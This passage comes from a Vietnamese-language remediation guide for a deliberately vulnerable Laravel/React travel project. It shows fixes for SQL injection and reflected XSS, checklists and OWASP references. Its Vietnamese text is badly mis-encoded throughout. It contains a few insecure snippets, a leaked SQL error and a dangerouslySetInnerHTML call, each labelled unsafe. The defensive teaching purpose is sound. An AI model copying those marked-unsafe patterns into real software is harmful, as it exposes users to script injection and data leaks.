    if (!is_numeric($id) || $id <= 0) {
        throw new ValidationException('Invalid ID format');
    }

    // ‚úÖ Cast to integer ƒë·ªÉ ƒë·∫£m b·∫£o an to√†n
    $id = (int) $id;

    return $this->model::with(['location', 'contact', 'features'])
        ->where('id', $id)
        ->whereNull('deleted_at')
        ->firstOrFail();
}
```

#### **Controller - Kh√¥ng expose l·ªói SQL chi ti·∫øt**

**File**: `app/Http/Controllers/Property/PropertyController.php`

```php
catch (\Illuminate\Database\QueryException $e) {
    // ‚ùå KH√îNG AN TO√ÄN: Expose l·ªói SQL chi ti·∫øt
    // return ApiResponse::error('SQL Error: ' . $e->getMessage(), ...);

    // ‚úÖ AN TO√ÄN: Ch·ªâ log l·ªói, kh√¥ng expose chi ti·∫øt
    Log::error('Database error', ['error' => $e->getMessage()]);
    return ApiResponse::error('L·ªói khi l·∫•y th√¥ng tin property', [], 500);
}
```

#### **Checklist v√° l·ªói SQL Injection**

- [ ] Thay th·∫ø raw SQL b·∫±ng Eloquent ORM ho·∫∑c Query Builder
- [ ] S·ª≠ d·ª•ng parameter binding cho t·∫•t c·∫£ user input
- [ ] Validate v√† sanitize input tr∆∞·ªõc khi query
- [ ] Kh√¥ng expose l·ªói SQL chi ti·∫øt trong production
- [ ] S·ª≠ d·ª•ng type casting (int, string) cho input
- [ ] Ki·ªÉm tra t·∫•t c·∫£ endpoint c√≥ s·ª≠ d·ª•ng raw SQL
- [ ] Review code ƒë·ªãnh k·ª≥ ƒë·ªÉ t√¨m SQL Injection

### 5. Kh·∫Øc ph·ª•c Reflected XSS

**File**: `backend_dev/app/Http/Controllers/Search/SearchController.php`

#### **Gi·∫£i ph√°p 1: Escape Output trong Controller (Khuy·∫øn ngh·ªã)**

```php
public function search(Request $request)
{
    $keyword = $request->input('q', '');

    // ‚úÖ AN TO√ÄN: Escape HTML entities
    $escapedKeyword = htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8');

    $data = $this->searchService->search($request);

    // ‚úÖ AN TO√ÄN: S·ª≠ d·ª•ng gi√° tr·ªã ƒë√£ ƒë∆∞·ª£c escape
    if ($data && method_exists($data, 'getCollection')) {
        $data->getCollection()->transform(function ($item) use ($escapedKeyword) {
            $item->search_keyword = $escapedKeyword; // ‚úÖ ƒê√£ escape
            return $item;
        });
    }

    // ‚úÖ AN TO√ÄN: Message ƒë√£ ƒë∆∞·ª£c escape
    $message = "K·∫øt qu·∫£ t√¨m ki·∫øm cho: " . $escapedKeyword;

    return $this->handleServiceResponse(
        $data,
        $message,
        "L·∫•y th√¥ng tin th·∫•t b·∫°i",
        200,
        500
    );
}
```

#### **Gi·∫£i ph√°p 2: Sanitize Input (B·ªï sung)**

```php
public function search(Request $request)
{
    $keyword = $request->input('q', '');

    // ‚úÖ AN TO√ÄN: Lo·∫°i b·ªè HTML tags
    $sanitizedKeyword = strip_tags($keyword);

    // ‚úÖ AN TO√ÄN: Escape HTML entities
    $escapedKeyword = htmlspecialchars($sanitizedKeyword, ENT_QUOTES, 'UTF-8');

    // ‚úÖ AN TO√ÄN: Gi·ªõi h·∫°n ƒë·ªô d√†i
    $escapedKeyword = mb_substr($escapedKeyword, 0, 100);

    // S·ª≠ d·ª•ng $escapedKeyword trong response...
}
```

#### **Gi·∫£i ph√°p 3: Validation Input**

```php
public function search(Request $request)
{
    // ‚úÖ AN TO√ÄN: Validate input
    $validated = $request->validate([
        'q' => 'required|string|max:100|regex:/^[a-zA-Z0-9\s\-_]+$/', // Ch·ªâ cho ph√©p k√Ω t·ª± an to√†n
    ]);

    $keyword = $validated['q'];

    // ‚úÖ AN TO√ÄN: Escape output
    $escapedKeyword = htmlspecialchars($keyword, ENT_QUOTES, 'UTF-8');

    // S·ª≠ d·ª•ng $escapedKeyword trong response...
}
```

#### **Gi·∫£i ph√°p 4: Content Security Policy (CSP) Header**

**File**: `app/Http/Middleware/SecurityHeaders.php`

```php
public function handle($request, Closure $next)
{
    $response = $next($request);

    // ‚úÖ AN TO√ÄN: Th√™m CSP header ƒë·ªÉ ngƒÉn XSS
    $response->headers->set('Content-Security-Policy',
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
    );

    return $response;
}
```

#### **Gi·∫£i ph√°p 5: Frontend Protection (React/Vue)**

```javascript
// ‚úÖ AN TO√ÄN: React t·ª± ƒë·ªông escape
function SearchResults({ keyword }) {
  return <div>K·∫øt qu·∫£ t√¨m ki·∫øm cho: {keyword}</div>; // ‚úÖ T·ª± ƒë·ªông escape
}

// ‚ùå KH√îNG AN TO√ÄN: dangerouslySetInnerHTML
function SearchResults({ keyword }) {
  return <div dangerouslySetInnerHTML={{ __html: keyword }} />; // ‚ùå Kh√¥ng escape
}
```

#### **Checklist v√° l·ªói XSS**

- [ ] Escape t·∫•t c·∫£ output v·ªõi `htmlspecialchars()` ho·∫∑c `e()`
- [ ] Sanitize input v·ªõi `strip_tags()` n·∫øu c·∫ßn
- [ ] Validate input v·ªõi Laravel Validation
- [ ] S·ª≠ d·ª•ng Blade `{{ }}` thay v√¨ `{!! !!}` (n·∫øu d√πng Blade)
- [ ] Th√™m Content Security Policy (CSP) headers
- [ ] Frontend: S·ª≠ d·ª•ng framework t·ª± ƒë·ªông escape (React, Vue)
- [ ] Kh√¥ng s·ª≠ d·ª•ng `dangerouslySetInnerHTML` ho·∫∑c `v-html`
- [ ] Ki·ªÉm tra t·∫•t c·∫£ endpoint tr·∫£ v·ªÅ user input
- [ ] Review code ƒë·ªãnh k·ª≥ ƒë·ªÉ t√¨m XSS

---

## üìö T√†i li·ªáu tham kh·∫£o

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Laravel Security Documentation](https://laravel.com/docs/security)
- [CWE-200: Information Exposure](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-79: XSS](https://cwe.mitre.org/data/definitions/79.html)

---

## ‚ö†Ô∏è L∆∞u √Ω quan tr·ªçng

1. **Ch·ªâ s·ª≠ d·ª•ng trong m√¥i tr∆∞·ªùng test**: C√°c l·ªó h·ªïng n√†y ƒë∆∞·ª£c t·∫°o c√≥ ch·ªß √Ω ƒë·ªÉ h·ªçc t·∫≠p v√† ki·ªÉm th·ª≠.

2. **Kh√¥ng s·ª≠ d·ª•ng tr√™n production**: Tr∆∞·ªõc khi deploy l√™n production, **PH·∫¢I** kh·∫Øc ph·ª•c t·∫•t c·∫£ c√°c l·ªó h·ªïng.

3. **Ki·ªÉm th·ª≠ c√≥ tr√°ch nhi·ªám**: Ch·ªâ ki·ªÉm th·ª≠ tr√™n h·ªá th·ªëng m√† b·∫°n c√≥ quy·ªÅn. Ki·ªÉm th·ª≠ tr√™n h·ªá th·ªëng kh√¥ng ƒë∆∞·ª£c ph√©p l√† b·∫•t h·ª£p ph√°p.

4. **B√°o c√°o l·ªó h·ªïng**: N·∫øu ph√°t hi·ªán l·ªó h·ªïng tr√™n h·ªá th·ªëng c·ªßa ng∆∞·ªùi kh√°c, h√£y b√°o c√°o m·ªôt c√°ch c√≥ tr√°ch nhi·ªám (Responsible Disclosure).

---

**Ng√†y t·∫°o**: $(date)  
**Phi√™n b·∫£n**: 2.0  
**T√°c gi·∫£**: Security Team  
**D·ª± √°n**: Travel Taynd - Backend & Frontend
